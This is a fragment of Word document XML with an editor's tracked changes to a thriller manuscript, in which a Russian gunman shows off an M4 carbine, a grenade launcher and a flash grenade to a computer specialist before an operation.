          <w:delText xml:space="preserve"> on two legs</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Leo, the gunman who</w:t>
      </w:r>
      <w:ins w:id="2694" w:author="TextVet" w:date="2016-03-28T10:07:00Z">
        <w:r w:rsidR="00524447">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2695" w:author="TextVet" w:date="2016-03-28T10:07:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00524447">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> ha</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d shot Danny in the shoulder</w:t>
      </w:r>
      <w:del w:id="2696" w:author="TextVet" w:date="2016-03-28T10:08:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00524447">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> twenty-four hours ago</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, wrapped himself in a ballistic vest and helmet like </w:t>
      </w:r>
      <w:del w:id="2697" w:author="TextVet" w:date="2016-03-28T10:07:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AE4A99">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">the ones on </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Sergey</w:t>
      </w:r>
      <w:ins w:id="2698" w:author="TextVet" w:date="2016-03-28T10:07:00Z">
        <w:r w:rsidR="00AE4A99">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 xml:space="preserve">. Instead of the shield and MAC-10, though, Leo opted for a spiny black multi-component rifle with enough switches and levers to rival a church organ. A sophisticated scope ran along its top. A ridged hollow tube, about as big as a cardboard paper towel roll, hung beneath its barrel. The precision engineering of the many modular interlocking pieces astounded Danny; </w:t>
      </w:r>
      <w:ins w:id="2699" w:author="TextVet" w:date="2016-03-28T10:09:00Z">
        <w:r w:rsidR="00EE5013">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>beholding</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2700" w:author="TextVet" w:date="2016-03-28T10:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EE5013">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>looking at</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> it, </w:t>
      </w:r>
      <w:ins w:id="2701" w:author="TextVet" w:date="2016-03-28T10:09:00Z">
        <w:r w:rsidR="00EE5013">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">he </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2702" w:author="TextVet" w:date="2016-03-28T10:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EE5013">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">it was clear to him </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2703" w:author="TextVet" w:date="2016-03-28T10:09:00Z">
        <w:r w:rsidR="00EE5013">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">deduced </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">that </w:t>
      </w:r>
      <w:del w:id="2704" w:author="TextVet" w:date="2016-03-28T10:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EE5013">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">the people </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>who</w:t>
      </w:r>
      <w:ins w:id="2705" w:author="TextVet" w:date="2016-03-28T10:09:00Z">
        <w:r w:rsidR="00EE5013">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ever</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="2706" w:author="TextVet" w:date="2016-03-28T10:09:00Z">
        <w:r w:rsidR="00EE5013">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">had </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">developed </w:t>
      </w:r>
      <w:ins w:id="2707" w:author="TextVet" w:date="2016-03-28T10:10:00Z">
        <w:r w:rsidR="00E8604A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>i</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:del w:id="2708" w:author="TextVet" w:date="2016-03-28T10:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E8604A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>hat firearm</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> knew as much about alloys and ballistics as he </w:t>
      </w:r>
      <w:ins w:id="2709" w:author="TextVet" w:date="2016-03-28T10:10:00Z">
        <w:r w:rsidR="00EE5013">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>did</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2710" w:author="TextVet" w:date="2016-03-28T10:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EE5013">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>knew</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> about computers and electronics.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the hell is that?” Danny couldn’t help asking.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“This?” </w:t>
      </w:r>
      <w:ins w:id="2711" w:author="TextVet" w:date="2016-03-28T10:12:00Z">
        <w:r w:rsidR="00991A23">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>confirme</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2712" w:author="TextVet" w:date="2016-03-28T10:12:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00991A23">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 Leo</w:t>
      </w:r>
      <w:ins w:id="2713" w:author="TextVet" w:date="2016-03-28T10:12:00Z">
        <w:r w:rsidR="00A36C33">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del w:id="2714" w:author="TextVet" w:date="2016-03-28T10:12:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A36C33">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">with a </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>grin</w:t>
      </w:r>
      <w:ins w:id="2715" w:author="TextVet" w:date="2016-03-28T10:12:00Z">
        <w:r w:rsidR="00A36C33">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ning</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> as he checked the intricate parts of the weapons system. “This is standard-issue M4 carbine. It has suppressor and muzzle break, M68 CCO reflex sight and an M203 grenade launcher.” He held it up proudly. “I call her Matilda.”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grenade launcher? Guys, that was</w:t>
      </w:r>
      <w:del w:id="2716" w:author="TextVet" w:date="2016-03-28T10:13:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001A09A0">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n</w:t>
      </w:r>
      <w:ins w:id="2717" w:author="TextVet" w:date="2016-03-28T10:13:00Z">
        <w:r w:rsidR="001A09A0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2718" w:author="TextVet" w:date="2016-03-28T10:13:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001A09A0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>o</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t part of the plan!”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“You stay with computer stuff,” said Leo. “Leave </w:t>
      </w:r>
      <w:del w:id="2719" w:author="TextVet" w:date="2016-03-28T10:13:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FB0DB7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">the </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">fighting </w:t>
      </w:r>
      <w:del w:id="2720" w:author="TextVet" w:date="2016-03-28T10:13:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FB0DB7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">stuff </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to us. You don’t tell us how to do our job</w:t>
      </w:r>
      <w:ins w:id="2721" w:author="TextVet" w:date="2016-03-28T10:13:00Z">
        <w:r w:rsidR="00FB0DB7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2722" w:author="TextVet" w:date="2016-03-28T10:13:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FB0DB7">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we won’t tell you how to do yours.”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“Does your job involve picking out pieces of Sergey’s daughter from piles of gibs and putting her back together with duct tape?” </w:t>
      </w:r>
      <w:ins w:id="2723" w:author="TextVet" w:date="2016-03-28T10:14:00Z">
        <w:r w:rsidR="00FB795D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>cautioned</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2724" w:author="TextVet" w:date="2016-03-28T10:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FB795D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">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Leo rolled his eyes and scoffed, “Idiot.” The Russian gunman reached into the van and pulled out a black rubber cylinder, rounded on one side</w:t>
      </w:r>
      <w:ins w:id="2725" w:author="TextVet" w:date="2016-03-28T10:15:00Z">
        <w:r w:rsidR="00D345C0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2726" w:author="TextVet" w:date="2016-03-28T10:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D345C0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>. It was</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> shaped like a bullet, but the size of a pill bottle. “We use </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2727" w:author="TextVet" w:date="2016-03-28T10:15:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>this</w:t>
      </w:r>
      <w:ins w:id="2728" w:author="TextVet" w:date="2016-03-28T10:15:00Z">
        <w:r w:rsidR="00D345C0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2729" w:author="TextVet" w:date="2016-03-28T10:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D345C0">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w:t>
      </w:r>
      <w:del w:id="2730" w:author="TextVet" w:date="2016-03-28T10:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D345C0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> he said.</w:delText>
        </w:r>
      </w:del>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w:t>
      </w:r>
      <w:ins w:id="2731" w:author="TextVet" w:date="2016-03-28T10:15:00Z">
        <w:r w:rsidR="00400EC6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2732" w:author="TextVet" w:date="2016-03-28T10:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00400EC6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> i</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:ins w:id="2733" w:author="TextVet" w:date="2016-03-28T10:15:00Z">
        <w:r w:rsidR="00400EC6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>tha</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2734" w:author="TextVet" w:date="2016-03-28T10:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00400EC6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>i</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t?”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grinned. “It is how you make an entrance.”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Leo laughed lightly. “</w:t>
      </w:r>
      <w:ins w:id="2735" w:author="TextVet" w:date="2016-03-28T10:16:00Z">
        <w:r w:rsidR="0035494B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>F</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2736" w:author="TextVet" w:date="2016-03-28T10:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0035494B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>It is f</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>orty-millimeter spin-stabilized flash grenade</w:t>
      </w:r>
      <w:ins w:id="2737" w:author="TextVet" w:date="2016-03-28T10:26:00Z">
        <w:r w:rsidR="00E15D7E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">: </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2738" w:author="TextVet" w:date="2016-03-28T10:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0035494B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">. </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2739" w:author="TextVet" w:date="2016-03-28T10:26:00Z">
        <w:r w:rsidR="00E15D7E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>y</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2740" w:author="TextVet" w:date="2016-03-28T10:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E15D7E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Y</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ou do not want to be looking at it when it goes off.”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Sergey smiled, shook his head, and said mirthfully, “Nooooo, you really, really don’t!” The two seemed to share an inside joke of some kind — a recollection, perhaps, of battles past.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few feet away, Eugene practiced turning, twisting, and kicking in his gear. He opted for a thinner, lighter ballistic vest and a bowl-shaped open-faced helmet, affording him fast, easy movement.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passed him a bigger helmet, with side coverage and a faceplate like the kind he and Leo wore.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scoffed</w:t>
      </w:r>
      <w:del w:id="2741" w:author="TextVet" w:date="2016-03-28T10:28:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001349B5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> at it</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
